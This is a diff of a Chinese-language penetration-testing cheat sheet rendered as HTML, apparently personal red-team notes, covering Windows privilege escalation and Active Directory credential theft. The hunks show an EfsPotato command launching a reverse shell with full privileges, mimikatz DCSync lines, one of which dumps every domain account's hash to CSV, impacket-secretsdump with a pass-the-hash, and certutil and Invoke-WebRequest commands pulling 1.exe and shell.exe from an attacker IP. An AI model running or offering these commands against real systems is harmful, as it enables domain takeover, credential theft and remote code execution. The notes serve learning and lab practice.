-</h4><p>有时候我们登陆服务账户可能会发现特权被关闭</p>
+</h4><p>有时候我们登陆本地服务账户可能会发现特权被关闭</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SHELL&gt; whoami /all
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>USER INFORMATION
@@ -2480,6 +2532,7 @@ nxc</p>
 </span></span></code></pre></div><p>直接执行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\E</span>fsPotato.exe <span style="color:#e6db74">&#34;远程载荷或者反弹shell&#34;</span>
 </span></span></code></pre></div><p>弹回来的shell就全开权限了</p>
+<p>注意，此功能只只能对nt authority\local service用户其效果，如果发现常规服务没有模拟权限，应该是开启了windows服务强化最小权限划分，这个低等权限是没法开启的</p>
 <h3 id="seenabledelegationprivilege">SeEnableDelegationPrivilege
 </h3><p>允许我们创建两种在我们掌控机器上的委派类型</p>
 <h4 id="创建无约束委派">创建无约束委派
@@ -3457,9 +3510,11 @@ targetedKerberoast.py</p>
 <h2 id="落地凭证抓取dcsynclsass内存抓取sam或者ntds本地抓取">落地凭证抓取（dcsync，lsass内存抓取，sam或者ntds本地抓取）
 </h2><h3 id="mimikatz-dcsync">mimikatz-dcsync
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>privilege::debug
-</span></span><span style="display:flex;"><span>lsadump::dcsync /domain:prod.corp1.com /user:prod<span style="color:#ae81ff">\k</span>rbtgt
+</span></span><span style="display:flex;"><span>lsadump::dcsync /domain:xiaorang.lab /user:xiaorang<span style="color:#ae81ff">\a</span>dministrator
 </span></span></code></pre></div><p>添加/history参数有可能能看到用户历史密码</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>lsadump::dcsync /domain:prod.corp1.com /user:prod<span style="color:#ae81ff">\m</span>att /history
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>lsadump::dcsync /domain:$domain /user:prod<span style="color:#ae81ff">\m</span>att /history
+</span></span></code></pre></div><p>也可以全部抓取</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;lsadump::dcsync /domain:</span>$domain<span style="color:#e6db74"> /all /csv&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
 </span></span></code></pre></div><h3 id="impacket-1">impacket
 </h3><p>hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-secretsdump $domain/$user@$ip -hashes $hash -target-ip $ip
@@ -3801,7 +3856,7 @@ linux换行</p>
 </span></span></code></pre></div><h3 id="windows上传文件">windows上传文件
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cmd
 </span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//你的IP/文件路径 保存路径
-</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">9</span>/<span style="color:#ae81ff">1</span>.exe C:\windows\tasks\<span style="color:#ae81ff">1</span>.exe
+</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.174.<span style="color:#ae81ff">3</span>/<span style="color:#ae81ff">1</span>.exe C:\windows\tasks\<span style="color:#ae81ff">1</span>.exe
 </span></span><span style="display:flex;"><span>powershell
 </span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.16.<span style="color:#ae81ff">23</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">4444</span>/shell.exe -OutFile <span style="color:#e6db74">&#34;C:\users\sqlsvc\Documents&#34;</span>
 </span></span><span style="display:flex;"><span>或者
